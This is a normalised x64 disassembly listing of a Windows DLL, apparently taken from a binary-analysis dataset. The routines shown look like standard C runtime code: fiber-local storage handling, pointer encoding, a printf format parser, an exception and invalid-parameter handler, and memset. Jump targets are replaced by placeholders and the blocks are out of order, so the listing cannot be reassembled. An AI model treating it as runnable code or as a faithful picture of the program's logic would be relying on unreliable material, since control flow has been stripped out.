or [ rbx + 0x8 ] 0xffffffffffffffff
mov [ rbx ] eax
jmp r-xdata
sub_180007a70
test rcx rcx
je r-xdata
retn
mov [ rsp + 0x10 ] rbx
push rdi
sub rsp 0x20
mov rbx rcx
mov rcx [ rcx + 0x38 ]
test rcx rcx
je r-xdata
mov rcx [ rbx + 0x48 ]
test rcx rcx
je r-xdata
call sub_180006da4
mov rcx [ rbx + 0x58 ]
test rcx rcx
je r-xdata
call sub_180006da4
mov rcx [ rbx + 0x68 ]
test rcx rcx
je r-xdata
call sub_180006da4
mov rcx [ rbx + 0x70 ]
test rcx rcx
je r-xdata
call sub_180006da4
mov rcx [ rbx + 0x78 ]
test rcx rcx
je r-xdata
call sub_180006da4
mov rcx [ rbx + 0x80 ]
test rcx rcx
je r-xdata
call sub_180006da4
mov rcx [ rbx + 0xa0 ]
lea rax [ r--data ]
cmp rcx rax
je r-xdata
call sub_180006da4
mov edi 0xd
mov ecx edi
call sub_18000c3c4
nop
mov rcx [ rbx + 0xb8 ]
mov [ rsp + 0x30 ] rcx
test rcx rcx
je r-xdata
call sub_180006da4
mov ecx edi
call sub_18000c2c4
mov ecx 0xc
call sub_18000c3c4
nop
mov rdi [ rbx + 0xc0 ]
test rdi rdi
je r-xdata
[ rcx ]
jne r-xdata
mov ecx 0xc
call sub_18000c2c4
mov rcx rbx
call sub_180006da4
mov rbx [ rsp + 0x38 ]
add rsp 0x20
pop rdi
mov rcx rdi
call sub_180009a9c
cmp rdi [ rw-data ]
je r-xdata
lea rax [ rw-data ]
mov rcx [ rsp + 0x30 ]
cmp rcx rax
je r-xdata
lea rax [ rw-data ]
cmp rdi rax
je r-xdata
call sub_180006da4
nop
cmp [ rdi ] 0x0
jne r-xdata
mov rcx rdi
call sub_180009b40
nop
sub_180007ba4
push rbx
sub rsp 0x20
mov rbx rcx
mov ecx [ rw-data ]
cmp ecx 0xffffffff
je r-xdata
add rsp 0x20
pop rbx
retn
test rbx rbx
jne r-xdata
xor edx edx
call [ FlsSetValue@IAT ]
mov rcx rbx
call sub_180007a70
call [ FlsGetValue@IAT ]
mov ecx [ rw-data ]
mov rbx rax
sub_180007be4
push rbx
sub rsp 0x20
call sub_18000a658
call sub_18000c1b8
test eax eax
je r-xdata
call sub_1800078e8
xor eax eax
lea rcx [ sub_180007a70 ]
call [ FlsAlloc@IAT ]
mov [ rw-data ] eax
cmp eax 0xffffffff
je r-xdata
mov edx 0x2c8
mov ecx 0x1
call sub_18000a4e0
mov rbx rax
test rax rax
je r-xdata
mov ecx [ rw-data ]
mov rdx rax
call [ FlsSetValue@IAT ]
test eax eax
je r-xdata
xor edx edx
mov rcx rbx
call sub_180007910
call [ GetCurrentThreadId@IAT ]
or [ rbx + 0x8 ] 0xffffffffffffffff
mov [ rbx ] eax
mov eax 0x1
jmp r-xdata
add rsp 0x20
pop rbx
retn
sub_180007c68
push rbx
sub rsp 0x20
mov edx 0x8
lea ecx [ rdx + 0x18 ]
call sub_18000a4e0
mov rcx rax
mov rbx rax
call [ EncodePointer@IAT ]
mov [ rw-data ] rax
mov [ rw-data ] rax
test rbx rbx
jne r-xdata
and [ rbx ] 0x0
xor eax eax
lea eax [ rbx + 0x18 ]
jmp r-xdata
add rsp 0x20
pop rbx
retn
sub_180007cac
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
mov [ rsp + 0x18 ] rdi
push r12
push r13
push r14
sub rsp 0x20
mov r14 rcx
call sub_18000a640
nop
mov rcx [ rw-data ]
call [ DecodePointer@IAT ]
mov r12 rax
mov rcx [ rw-data ]
call [ DecodePointer@IAT ]
mov rbx rax
cmp rax r12
jb r-xdata
xor ebx ebx
mov rdi rax
sub rdi r12
lea r13 [ rdi + 0x8 ]
cmp r13 0x8
jb r-xdata
mov rcx r12
call sub_18000c408
mov rsi rax
cmp rax r13
jae r-xdata
mov rcx r14
call [ EncodePointer@IAT ]
mov [ rbx ] rax
lea rcx [ rbx + 0x8 ]
call [ EncodePointer@IAT ]
mov [ rw-data ] rax
mov rbx r14
jmp r-xdata
mov edx 0x1000
cmp rax rdx
cmovb rdx rax
add rdx rax
cmp rdx rax
jb r-xdata
call sub_18000a64c
mov rax rbx
mov rbx [ rsp + 0x40 ]
mov rsi [ rsp + 0x48 ]
mov rdi [ rsp + 0x50 ]
add rsp 0x20
pop r14
pop r13
pop r12
retn
xor ebx ebx
mov rcx r12
call sub_18000a564
xor ebx ebx
test rax rax
jne r-xdata
mov rcx r12
call sub_18000a564
test rax rax
je r-xdata
sar rdi 0x3
lea rbx [ rax + rdi * 8 ]
mov rcx rax
call [ EncodePointer@IAT ]
mov [ rw-data ] rax
jmp r-xdata
lea rdx [ rsi + 0x20 ]
cmp rdx rsi
jb r-xdata
sub_180007dd8
push rbx
sub rsp 0x20
mov rbx rcx
mov rcx [ rw-data ]
call [ DecodePointer@IAT ]
test rax rax
je r-xdata
xor eax eax
mov rcx rbx
call rax
test eax eax
je r-xdata
mov eax 0x1
jmp r-xdata
add rsp 0x20
pop rbx
retn
sub_180007e0c
mov [ rsp + 0x10 ] rbx
mov [ rsp + 0x18 ] rdi
push rbp
mov rbp rsp
sub rsp 0x60
mov rdi rdx
mov rbx rcx
lea rcx [ rbp - 0x40 ]
lea rdx [ r--data ]
mov r8d 0x40
call sub_180006a70
lea rdx [ rbp + 0x10 ]
mov rcx rdi
mov [ rbp - 0x18 ] rbx
mov [ rbp - 0x10 ] rdi
call RtlPcToFileHeader
mov r11 rax
mov [ rbp + 0x10 ] rax
mov [ rbp - 0x8 ] rax
test rdi rdi
je r-xdata
mov r8d [ rbp - 0x28 ]
mov edx [ rbp - 0x3c ]
mov ecx [ rbp - 0x40 ]
lea r9 [ rbp - 0x20 ]
call [ RaiseException@IAT ]
lea r11 [ rsp + 0x60 ]
mov rbx [ r11 + 0x18 ]
mov rdi [ r11 + 0x20 ]
mov rsp r11
pop rbp
retn
test [ rdi ] 0x8
mov ecx 0x1994000
je r-xdata
mov eax [ rbp - 0x20 ]
test r11 r11
cmove eax ecx
mov [ rbp - 0x20 ] eax
mov [ rbp - 0x20 ] ecx
jmp r-xdata
sub_180007ea0
mov rax rsp
mov [ rax + 0x10 ] rbx
mov [ rax + 0x18 ] rbp
mov [ rax + 0x20 ] rsi
mov [ rax + 0x8 ] ecx
push rdi
sub rsp 0x20
mov rcx rdx
mov rbx rdx
call sub_18000baa4
mov ecx [ rbx + 0x18 ]
movsxd rsi eax
test cl 0x82
jne r-xdata
test cl 0x40
je r-xdata
call sub_180006ee4
mov [ rax ] 0x9
xor edi edi
test cl 0x1
je r-xdata
call sub_180006ee4
mov [ rax ] 0x22
jmp r-xdata
mov rbx [ rsp + 0x38 ]
mov rbp [ rsp + 0x40 ]
mov rsi [ rsp + 0x48 ]
add rsp 0x20
pop rdi
retn
mov eax [ rbx + 0x18 ]
mov [ rbx + 0x8 ] edi
and eax 0xffffffef
or eax 0x2
mov [ rbx + 0x18 ] eax
test eax 0x10c
jne r-xdata
mov [ rbx + 0x8 ] edi
test cl 0x10
je r-xdata
or [ rbx + 0x18 ] 0x20
test [ rbx + 0x18 ] 0x108
je r-xdata
call sub_18000b814
add rax 0x30
cmp rbx rax
je r-xdata
or ecx 0x20
mov [ rbx + 0x18 ] ecx
jmp r-xdata
mov rax [ rbx + 0x10 ]
and ecx 0xfffffffe
mov [ rbx ] rax
mov [ rbx + 0x18 ] ecx
mov ebp 0x1
lea rdx [ rsp + 0x30 ]
mov ecx esi
mov r8d ebp
call sub_18000cd20
mov edi eax
mov ebp [ rbx ]
mov rdx [ rbx + 0x10 ]
sub ebp [ rbx + 0x10 ]
lea rax [ rdx + 0x1 ]
mov [ rbx ] rax
mov eax [ rbx + 0x24 ]
dec eax
mov [ rbx + 0x8 ] eax
test ebp ebp
jle r-xdata
mov ecx esi
call sub_18000ce54
test eax eax
jne r-xdata
call sub_18000b814
add rax 0x60
cmp rbx rax
jne r-xdata
or eax 0xffffffff
jmp r-xdata
movzx eax [ rsp + 0x30 ]
cmp esi 0xffffffff
je r-xdata
mov r8d ebp
mov ecx esi
call sub_18000cd20
mov edi eax
jmp r-xdata
mov rcx rbx
call sub_18000ce00
lea rcx [ rw-data ]
cmp esi 0xfffffffe
je r-xdata
mov rcx [ rbx + 0x10 ]
mov al [ rsp + 0x30 ]
mov [ rcx ] al
jmp r-xdata
xor edx edx
mov ecx esi
lea r8d [ rdx + 0x2 ]
call sub_18000c4dc
cmp rax 0xffffffffffffffff
je r-xdata
mov rcx rsi
mov rax rsi
lea rdx [ rw-data ]
and ecx 0x1f
sar rax 0x5
imul rcx rcx 0x58
add rcx [ rdx + rax * 8 ]
jmp r-xdata
cmp edi ebp
jne r-xdata
test [ rcx + 0x8 ] 0x20
je r-xdata
sub_180008030
push rbx
sub rsp 0x20
test [ rdx + 0x18 ] 0x40
mov rbx r8
je r-xdata
dec [ rdx + 0x8 ]
js r-xdata
cmp [ rdx + 0x10 ] 0x0
jne r-xdata
movsx ecx cl
call sub_180007ea0
mov rax [ rdx ]
mov [ rax ] cl
inc [ rdx ]
movzx eax cl
jmp r-xdata
inc [ r8 ]
jmp r-xdata
inc [ rbx ]
or [ rbx ] eax
jmp r-xdata
cmp eax 0xffffffff
jne r-xdata
add rsp 0x20
pop rbx
retn
sub_180008078
test edx edx
jle r-xdata
retn
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
mov [ rsp + 0x18 ] rsi
push rdi
sub rsp 0x20
mov rdi r9
mov rsi r8
mov ebx edx
mov bpl cl
mov rbx [ rsp + 0x30 ]
mov rbp [ rsp + 0x38 ]
mov rsi [ rsp + 0x40 ]
add rsp 0x20
pop rdi
test ebx ebx
jg r-xdata
mov r8 rdi
mov rdx rsi
mov cl bpl
dec ebx
call sub_180008030
cmp [ rdi ] 0xffffffff
je r-xdata
sub_1800080cc
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
mov [ rsp + 0x18 ] rsi
push rdi
push r12
push r13
sub rsp 0x20
test [ r8 + 0x18 ] 0x40
mov rbx [ rsp + 0x60 ]
mov rdi r9
mov r12d [ rbx ]
mov rbp r8
mov esi edx
mov r13 rcx
je r-xdata
and [ rbx ] 0x0
test edx edx
jle r-xdata
cmp [ r8 + 0x10 ] 0x0
jne r-xdata
mov [ rbx ] r12d
mov cl [ r13 ]
mov r8 rdi
mov rdx rbp
dec esi
call sub_180008030
inc r13
cmp [ rdi ] 0xffffffff
jne r-xdata
add [ r9 ] edx
jmp r-xdata
test esi esi
jg r-xdata
cmp [ rbx ] 0x2a
jne r-xdata
mov rbx [ rsp + 0x40 ]
mov rbp [ rsp + 0x48 ]
mov rsi [ rsp + 0x50 ]
add rsp 0x20
pop r13
pop r12
pop rdi
retn
cmp [ rbx ] 0x0
jne r-xdata
mov r8 rdi
mov rdx rbp
mov cl 0x3f
call sub_180008030
sub_180008164
mov [ rsp + 0x18 ] rbx
push rbp
push rsi
push rdi
push r12
push r13
push r14
push r15
lea rbp [ rsp - 0x1d0 ]
sub rsp 0x2d0
mov rax [ rw-data ]
xor rax rsp
mov [ rbp + 0x1c8 ] rax
xor eax eax
mov rbx rcx
mov [ rsp + 0x70 ] rcx
mov [ rsp + 0x68 ] rdx
lea rcx [ rbp - 0x80 ]
mov rdx r8
mov r14 r9
mov [ rsp + 0x64 ] eax
mov r13d eax
mov [ rsp + 0x58 ] eax
mov edi eax
mov [ rsp + 0x44 ] eax
mov [ rsp + 0x4c ] eax
mov [ rsp + 0x5c ] eax
mov [ rsp + 0x54 ] eax
call sub_18000643c
call sub_180006ee4
xor r10d r10d
mov [ rbp - 0x60 ] rax
test rbx rbx
jne r-xdata
or r15d 0xffffffff
test [ rbx + 0x18 ] 0x40
lea r9 [ __dos_header ]
jne r-xdata
call sub_180006ee4
mov [ rax ] 0x16
call sub_180008e08
xor r11d r11d
cmp [ rbp - 0x68 ] r11b
je r-xdata
mov r8 [ rsp + 0x68 ]
test r8 r8
je r-xdata
mov rcx rbx
call sub_18000baa4
lea rdx [ rw-data ]
cmp eax r15d
je r-xdata
or eax 0xffffffff
jmp r-xdata
mov rax [ rbp - 0x70 ]
and [ rax + 0xc8 ] 0xfffffffd
call sub_180006ee4
mov [ rax ] 0x16
call sub_180008e08
xor r11d r11d
cmp [ rbp - 0x68 ] r11b
mov r12b [ r8 ]
mov esi r10d
mov [ rsp + 0x40 ] r10d
mov [ rsp + 0x48 ] r10d
mov edx r10d
mov [ rbp - 0x50 ] r10
test r12b r12b
je r-xdata
mov r8 rdx
lea r9 [ __dos_header ]
cmp eax 0xfffffffe
je r-xdata
mov rcx [ rbp + 0x1c8 ]
xor rcx rsp
call sub_180006220
mov rbx [ rsp + 0x320 ]
add rsp 0x2d0
pop r15
pop r14
pop r13
pop r12
pop rdi
pop rsi
pop rbp
retn
mov eax r15d
jmp r-xdata
mov rax [ rbp - 0x70 ]
and [ rax + 0xc8 ] 0xfffffffd
cmp [ rbp - 0x68 ] r10b
je r-xdata
mov rbx [ rbp - 0x48 ]
mov r11d 0x200
cmp eax r15d
je r-xdata
movsxd r8 eax
lea r9 [ __dos_header ]
mov rcx r8
and r8d 0x1f
sar rcx 0x5
imul r8 r8 0x58
add r8 [ r9 + rcx * 8 + 0x481e0 ]
jmp r-xdata
mov eax esi
mov rcx [ rbp - 0x70 ]
and [ rcx + 0xc8 ] 0xfffffffd
lea eax [ r12 - 0x20 ]
cmp al 0x58
ja r-xdata
test [ rdx + 0x38 ] 0x80
je r-xdata
cmp eax 0xfffffffe
je r-xdata
test [ r8 + 0x38 ] 0x7f
jne r-xdata
mov ecx r10d
movsx rax r12b
movsx ecx [ rax + r9 + 0x17500 ]
and ecx 0xf
jmp r-xdata
xor r10d r10d
movsxd rdx eax
mov rax rdx
and edx 0x1f
sar rax 0x5
imul rdx rdx 0x58
add rdx [ r9 + rax * 8 + 0x481e0 ]
lea rdx [ rbp - 0x80 ]
movzx ecx r12b
mov [ rsp + 0x54 ] r10d
call sub_18000bf08
xor esi esi
test eax eax
je r-xdata
dec ecx
je r-xdata
movsxd rax edx
movsxd rcx ecx
lea rdx [ rax + rcx * 8 ]
movsx edx [ rdx + r9 + 0x17520 ]
sar edx 0x4
mov [ rsp + 0x60 ] edx
mov ecx edx
test edx edx
je r-xdata
mov rdx [ rsp + 0x70 ]
lea r8 [ rsp + 0x40 ]
mov cl r12b
call sub_180008030
mov esi [ rsp + 0x40 ]
xor r10d r10d
jmp r-xdata
mov rdx [ rsp + 0x70 ]
lea r8 [ rsp + 0x40 ]
mov cl r12b
call sub_180008030
mov rdx [ rsp + 0x68 ]
mov r12b [ rdx ]
inc rdx
mov [ rsp + 0x68 ] rdx
test r12b r12b
je r-xdata
mov [ rsp + 0x78 ] r10d
mov [ rsp + 0x5c ] r10d
mov [ rsp + 0x58 ] r10d
mov [ rsp + 0x4c ] r10d
mov r13d r10d
mov edi r15d
mov [ rsp + 0x44 ] r15d
mov [ rsp + 0x54 ] r10d
jmp r-xdata
dec ecx
je r-xdata
mov r8 [ rsp + 0x68 ]
mov edx [ rsp + 0x60 ]
mov r11d 0x200
lea r9 [ __dos_header ]
call sub_180006ee4
mov [ rax ] 0x16
call sub_180008e08
cmp [ rbp - 0x68 ] sil
jmp r-xdata
mov r12b [ r8 ]
test r12b r12b
jne r-xdata
cmp r12b 0x20
je r-xdata
dec ecx
je r-xdata
inc r8
mov [ rsp + 0x68 ] r8
test esi esi
js r-xdata
je r-xdata
or r13d 0x2
jmp r-xdata
cmp r12b 0x23
je r-xdata
cmp r12b 0x2a
jne r-xdata
dec ecx
je r-xdata
bts r13d 0x7
jmp r-xdata
cmp r12b 0x2b
je r-xdata
mov eax [ rsp + 0x58 ]
lea ecx [ rax + rax * 4 ]
movsx eax r12b
lea eax [ rax + rcx * 2 - 0x30 ]
mov eax [ r14 ]
add r14 0x8
mov [ rsp + 0x58 ] eax
test eax eax
jns r-xdata
mov edi r10d
mov [ rsp + 0x44 ] r10d
jmp r-xdata
dec ecx
je r-xdata
or r13d 0x1
jmp r-xdata
cmp r12b 0x2d
je r-xdata
or r13d 0x4
neg eax
jmp r-xdata
cmp r12b 0x2a
jne r-xdata
dec ecx
je r-xdata
or r13d 0x4
jmp r-xdata
cmp r12b 0x30
jne r-xdata
mov [ rsp + 0x58 ] eax
jmp r-xdata
lea ecx [ rdi + rdi * 4 ]
movsx eax r12b
lea edi [ rax + rcx * 2 - 0x30 ]
mov [ rsp + 0x44 ] edi
jmp r-xdata
mov edi [ r14 ]
add r14 0x8
mov [ rsp + 0x44 ] edi
test edi edi
jns r-xdata
cmp r12b 0x49
je r-xdata
dec ecx
jne r-xdata
or r13d 0x8
jmp r-xdata
mov edi r15d
mov [ rsp + 0x44 ] r15d
jmp r-xdata
mov al [ r8 ]
bts r13d 0xf
cmp al 0x36
jne r-xdata
cmp r12b 0x68
je r-xdata
movsx eax r12b
cmp eax 0x64
jg r-xdata
cmp al 0x33
jne r-xdata
cmp [ r8 + 0x1 ] 0x34
jne r-xdata
or r13d 0x20
jmp r-xdata
cmp r12b 0x6c
je r-xdata
cmp eax 0x65
jl r-xdata
je r-xdata
cmp al 0x64
je r-xdata
cmp [ r8 + 0x1 ] 0x32
jne r-xdata
add r8 0x2
bts r13d 0xf
jmp r-xdata
cmp [ r8 ] 0x6c
jne r-xdata
cmp r12b 0x77
jne r-xdata
cmp [ rsp + 0x5c ] r10d
jne r-xdata
cmp eax 0x67
jle r-xdata
or r13d 0x40
cmp eax 0x41
je r-xdata
cmp al 0x69
je r-xdata
add r8 0x2
btr r13d 0xf
jmp r-xdata
or r13d 0x10
jmp r-xdata
inc r8
bts r13d 0xc
jmp r-xdata
bts r13d 0xb
jmp r-xdata
mov rax [ rbp - 0x50 ]
test rax rax
je r-xdata
test r13b 0x40
je r-xdata
or r13d 0x40
lea rbx [ rbp - 0x40 ]
mov esi r11d
test edi edi
jns r-xdata
cmp eax 0x69
je r-xdata
mov r8 [ r14 ]
add r14 0x8
jmp r-xdata
bt r13d 0xc
jae r-xdata
mov [ rsp + 0x78 ] 0x1
add r12b 0x20
cmp eax 0x43
je r-xdata
cmp al 0x6f
je r-xdata
mov edi [ rsp + 0x44 ]
mov rcx rax
call sub_180006da4
xor r10d r10d
mov [ rbp - 0x50 ] r10
mov edi [ rsp + 0x4c ]
bt r13d 0x8
jae r-xdata
jne r-xdata
mov [ rsp + 0x44 ] 0x6
jmp r-xdata
cmp eax 0x6e
je r-xdata
test r13b 0x40
je r-xdata
add r14 0x8
test r13b 0x20
je r-xdata
test r13d 0x830
jne r-xdata
cmp eax 0x45
je r-xdata
cmp al 0x75
je r-xdata
mov rax [ rbp - 0x60 ]
lea r9 [ rsp + 0x40 ]
lea rcx [ rsp + 0x50 ]
mov r8 rsi
mov edx edi
mov [ rsp + 0x20 ] rax
call sub_1800080cc
test r13b 0x8
je r-xdata
lea r9 [ rsp + 0x40 ]
mov r8 rsi
mov edx r12d
mov cl 0x20
call sub_180008078
test r13b 0x1
je r-xdata
mov [ rsp + 0x50 ] 0x2d
jmp r-xdata
cmp edi r11d
cmovg edi r11d
mov [ rsp + 0x44 ] edi
cmp edi 0xa3
jle r-xdata
cmp r12b 0x67
jne r-xdata
mov rax [ r14 ]
mov rcx [ rw-data ]
add r14 0x8
movsx edi r12b
movsxd rsi esi
mov [ rbp - 0x48 ] rax
call [ DecodePointer@IAT ]
lea rcx [ rbp - 0x80 ]
mov r9d edi
mov [ rsp + 0x30 ] rcx
mov ecx [ rsp + 0x78 ]
mov r8 rsi
mov [ rsp + 0x28 ] ecx
mov ecx [ rsp + 0x44 ]
mov rdx rbx
mov [ rsp + 0x20 ] ecx
lea rcx [ rbp - 0x48 ]
call rax
mov edi r13d
and edi 0x80
je r-xdata
mov rdi [ r14 ]
add r14 0x8
call sub_18000ceec
xor r10d r10d
test eax eax
je r-xdata
cmp eax 0x6f
je r-xdata
test eax r13d
jne r-xdata
test r8 r8
jns r-xdata
test r13b 0x40
je r-xdata
test r13b 0x40
je r-xdata
add r14 0x8
test r13d 0x810
je r-xdata
bts r13d 0xb
cmp eax 0x47
je r-xdata
cmp al 0x78
je r-xdata
mov edi [ rsp + 0x48 ]
xor eax eax
cmp [ rsp + 0x54 ] eax
je r-xdata
test r13b 0x4
jne r-xdata
test r13b 0x2
je r-xdata
mov [ rsp + 0x50 ] 0x2b
mov edi 0x1
mov [ rsp + 0x4c ] edi
jmp r-xdata
add edi 0x15d
movsxd rcx edi
call sub_18000a460
mov [ rbp - 0x50 ] rax
test rax rax
je r-xdata
mov [ rsp + 0x44 ] 0x1
jmp r-xdata
cmp r12b 0x67
jne r-xdata
xor eax eax
cmp [ rsp + 0x44 ] eax
jne r-xdata
test r13b 0x20
je r-xdata
mov r9d 0x8
test r13b r13b
jns r-xdata
cmp eax 0x70
je r-xdata
test edi edi
jns r-xdata
bt r13d 0xc
jb r-xdata
neg r8
bts r13d 0x8
mov r8d [ r14 - 0x8 ]
movsxd r8 [ r14 - 0x8 ]
jmp r-xdata
movzx r8d [ r14 - 0x8 ]
jmp r-xdata
movsx r8 [ r14 - 0x8 ]
jmp r-xdata
mov al [ r14 - 0x8 ]
mov [ rsp + 0x48 ] 0x1
mov [ rbp - 0x40 ] al
movzx r9d [ r14 - 0x8 ]
lea rdx [ rbp - 0x40 ]
lea rcx [ rsp + 0x48 ]
mov r8 r11
call sub_18000d0c8
xor r10d r10d
test eax eax
je r-xdata
cmp eax 0x53
je r-xdata
cmp al 0x58
je r-xdata
mov rax [ rbp - 0x60 ]
lea r9 [ rsp + 0x40 ]
mov r8 rsi
mov edx edi
mov rcx rbx
mov [ rsp + 0x20 ] rax
call sub_1800080cc
xor r10d r10d
test edi edi
jle r-xdata
lea r9 [ rsp + 0x40 ]
mov r8 rsi
mov edx r12d
mov cl 0x30
call sub_180008078
mov [ rsp + 0x50 ] 0x20
jmp r-xdata
mov r12d [ rsp + 0x58 ]
mov rsi [ rsp + 0x70 ]
sub r12d [ rsp + 0x48 ]
sub r12d edi
test r13b 0xc
jne r-xdata
mov [ rsp + 0x44 ] 0xa3
mov rbx rax
mov esi edi
jmp r-xdata
cmp [ rbx ] 0x2d
jne r-xdata
test edi edi
jne r-xdata
mov rcx [ rw-data ]
call [ DecodePointer@IAT ]
lea rdx [ rbp - 0x80 ]
mov rcx rbx
call rax
mov [ rdi ] esi
mov [ rdi ] si
jmp r-xdata
mov edx [ rsp + 0x4c ]
or r13d r11d
jmp r-xdata
mov edi 0x10
bts r13d 0xf
cmp eax 0x73
je r-xdata
and r13d 0xfffffff7
cmp edi r11d
cmovg edi r11d
mov edi 0x1
jmp r-xdata
mov r8d r8d
lea rbx [ rbp - 0x40 ]
jmp r-xdata
mov [ rsp + 0x5c ] 0x1
jmp r-xdata
test r13d 0x830
jne r-xdata
cmp eax 0x58
je r-xdata
mov [ rsp + 0x60 ] r10d
test r13b 0x4
je r-xdata
mov rsi rbx
mov rcx rbx
call sub_18000be60
mov esi [ rsp + 0x40 ]
bts r13d 0x8
inc rbx
mov rcx [ rw-data ]
call [ DecodePointer@IAT ]
lea rdx [ rbp - 0x80 ]
mov rcx rbx
call rax
mov [ rsp + 0x5c ] 0x1
jmp r-xdata
add al 0x51
mov [ rsp + 0x50 ] 0x30
lea edx [ r9 - 0xe ]
mov [ rsp + 0x51 ] al
jmp r-xdata
mov rbx [ r14 ]
cmp edi r15d
mov eax edi
mov ecx 0x7fffffff
cmove eax ecx
add r14 0x8
test r13d 0x810
je r-xdata
cmp eax 0x75
je r-xdata
xor edx edx
mov rax r8
movsxd rcx r9d
div rcx
mov r8 rax
lea eax [ rdx + 0x30 ]
cmp eax 0x39
jle r-xdata
test r8 r8
je r-xdata
mov esi [ rsp + 0x64 ]
mov rax r8
lea rbx [ rbp + 0x1bf ]
neg rax
sbb ecx ecx
and ecx edx
mov [ rsp + 0x4c ] ecx
bts r13d 0xb
mov eax 0x7
cmp eax 0x5a
je r-xdata
mov r8 [ rsp + 0x70 ]
lea r9 [ rsp + 0x40 ]
mov edx r12d
mov cl 0x20
call sub_180008078
mov esi [ rsp + 0x40 ]
xor r10d r10d
mov esi r15d
mov [ rsp + 0x40 ] r15d
jmp r-xdata
mov edx [ rbp - 0x58 ]
test edx edx
je r-xdata
mov eax 0x8000
test eax r13d
jne r-xdata
test rbx rbx
cmove rbx [ rw-data ]
mov rcx rbx
jmp r-xdata
test rbx rbx
mov [ rsp + 0x54 ] 0x1
cmove rbx [ rw-data ]
mov rcx rbx
jmp r-xdata
mov r9d 0xa
cmp eax 0x78
jne r-xdata
mov [ rbx ] al
dec rbx
jmp r-xdata
add eax esi
mov esi [ rsp + 0x40 ]
lea rax [ rbp + 0x1bf ]
mov [ rsp + 0x44 ] edi
sub eax ebx
inc rbx
mov [ rsp + 0x48 ] eax
test r11d r13d
je r-xdata
mov rax [ r14 ]
add r14 0x8
test rax rax
je r-xdata
cmp eax 0x61
je r-xdata
test esi esi
js r-xdata
mov rax [ rbp - 0x60 ]
mov r8 [ rsp + 0x70 ]
lea r9 [ rsp + 0x40 ]
lea rcx [ rbp + 0x1c0 ]
mov [ rsp + 0x20 ] rax
call sub_1800080cc
xor r10d r10d
test edi edi
jne r-xdata
test eax eax
jne r-xdata
test eax eax
jne r-xdata
mov eax 0x27
jmp r-xdata
mov ecx edi
dec edi
test ecx ecx
jg r-xdata
test eax eax
je r-xdata
mov rbx [ rw-data ]
mov rcx rbx
call sub_18000be60
jmp r-xdata
mov rbx [ rax + 0x8 ]
test rbx rbx
je r-xdata
cmp eax 0x63
je r-xdata
movzx r9d [ rsi ]
lea rdx [ rbp + 0x1c0 ]
lea rcx [ rbp - 0x58 ]
mov r8d 0x6
dec edi
add rsi 0x2
call sub_18000d0c8
xor r10d r10d
test eax eax
jne r-xdata
jmp r-xdata
dec eax
cmp [ rcx ] r10b
je r-xdata
sub ecx ebx
dec eax
cmp [ rcx ] r10w
je r-xdata
sub rcx rbx
sar rcx 0x1
jmp r-xdata
mov [ rsp + 0x64 ] eax
mov r9d 0x10
test r13b r13b
jns r-xdata
dec rbx
inc [ rsp + 0x48 ]
mov [ rbx ] 0x30
jmp r-xdata
cmp [ rbx ] 0x30
je r-xdata
xor r10d r10d
movsx eax [ rax ]
bt r13d 0xb
jae r-xdata
jmp r-xdata
mov esi [ rsp + 0x40 ]
inc rcx
add rcx 0x2
mov [ rsp + 0x48 ] ecx
jmp r-xdata
mov [ rsp + 0x54 ] r10d
jmp r-xdata
cdq
mov [ rsp + 0x54 ] 0x1
sub eax edx
sar eax 0x1
jmp r-xdata
mov [ rsp + 0x48 ] eax
sub_180008c18
mov [ rsp + 0x10 ] rbx
mov [ rsp + 0x18 ] rsi
push rbp
push rdi
push r12
lea rbp [ rsp - 0x4f0 ]
sub rsp 0x5f0
mov rax [ rw-data ]
xor rax rsp
mov [ rbp + 0x4e0 ] rax
mov edi r8d
mov esi edx
mov ebx ecx
cmp ecx 0xffffffff
je r-xdata
and [ rsp + 0x70 ] 0x0
lea rcx [ rsp + 0x74 ]
xor edx edx
mov r8d 0x94
call sub_180008e40
lea r11 [ rsp + 0x70 ]
lea rax [ rbp + 0x10 ]
lea rcx [ rbp + 0x10 ]
mov [ rsp + 0x48 ] r11
mov [ rsp + 0x50 ] rax
call [ RtlCaptureContext@IAT ]
mov r12 [ rbp + 0x108 ]
lea rdx [ rsp + 0x40 ]
mov rcx r12
xor r8d r8d
call RtlLookupFunctionEntry
test rax rax
je r-xdata
call sub_18000c1b0
mov rax [ rbp + 0x508 ]
mov [ rbp + 0x108 ] rax
lea rax [ rbp + 0x508 ]
mov [ rbp + 0xa8 ] rax
and [ rsp + 0x38 ] 0x0
mov rdx [ rsp + 0x40 ]
lea rcx [ rsp + 0x60 ]
mov [ rsp + 0x30 ] rcx
lea rcx [ rsp + 0x58 ]
mov r9 rax
mov [ rsp + 0x28 ] rcx
lea rcx [ rbp + 0x10 ]
mov r8 r12
mov [ rsp + 0x20 ] rcx
xor ecx ecx
call RtlVirtualUnwind
jmp r-xdata
mov rcx [ rbp + 0x4e0 ]
xor rcx rsp
call sub_180006220
lea r11 [ rsp + 0x5f0 ]
mov rbx [ r11 + 0x28 ]
mov rsi [ r11 + 0x30 ]
mov rsp r11
pop r12
pop rdi
pop rbp
retn
test edi edi
jne r-xdata
mov rax [ rbp + 0x508 ]
mov [ rsp + 0x70 ] esi
mov [ rsp + 0x74 ] edi
mov [ rbp - 0x80 ] rax
call [ IsDebuggerPresent@IAT ]
xor ecx ecx
mov edi eax
call [ SetUnhandledExceptionFilter@IAT ]
lea rcx [ rsp + 0x48 ]
call [ UnhandledExceptionFilter@IAT ]
test eax eax
jne r-xdata
cmp ebx 0xffffffff
je r-xdata
mov ecx ebx
call sub_18000c1b0
sub_180008d98
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
mov [ rsp + 0x18 ] rsi
push rdi
sub rsp 0x30
mov rbp rcx
mov rcx [ rw-data ]
mov ebx r9d
mov rdi r8
mov rsi rdx
call [ DecodePointer@IAT ]
mov r9d ebx
mov r8 rdi
mov rdx rsi
mov rcx rbp
test rax rax
je r-xdata
mov rax [ rsp + 0x60 ]
mov [ rsp + 0x20 ] rax
call sub_180008d64
int3
mov r10 [ rsp + 0x60 ]
mov [ rsp + 0x20 ] r10
call rax
mov rbx [ rsp + 0x40 ]
mov rbp [ rsp + 0x48 ]
mov rsi [ rsp + 0x50 ]
add rsp 0x30
pop rdi
retn
sub_180008e40
mov rax rcx
cmp r8 0x8
jb r-xdata
test r8 r8
je r-xdata
movzx edx dl
mov r9 0x101010101010101
imul rdx r9
cmp r8 0x40
jb r-xdata
retn
mov [ rcx ] dl
